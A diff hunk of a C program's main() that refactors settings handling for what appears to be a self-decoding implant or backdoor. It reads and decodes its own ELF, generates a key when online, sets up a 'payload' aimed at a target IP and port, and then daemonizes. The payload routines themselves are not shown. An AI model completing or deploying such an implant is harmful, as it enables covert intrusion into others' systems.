@@ -5,16 +5,26 @@
 int main(int ac, char * const *av)
 {
     elf_utils_t *utils = NULL;
-    pid_t pid = 0;
+    settings_t g_settings = {
+        .logfd = 0,
+        .sockfd = 0,
+        .target_port = NULL,
+        .target_ip = NULL,
+    };
 
-    parse_settings(ac, av);
-    init();
+    parse_settings(ac, av, &g_settings);
+    init(&g_settings);
 
     utils = elf_read(av[0]);
-    if (!utils)
+    if (!utils) {
+        KILL("[!] Failure reading ELF\n");
         exit(1);
+    } else if (is_online)
+        generate_first_time_key(utils);
 
     elf_decode(utils);
-    setup_payload();
+
+    setup_payload(&g_settings);
+    daemonize();
     return 0;
 }
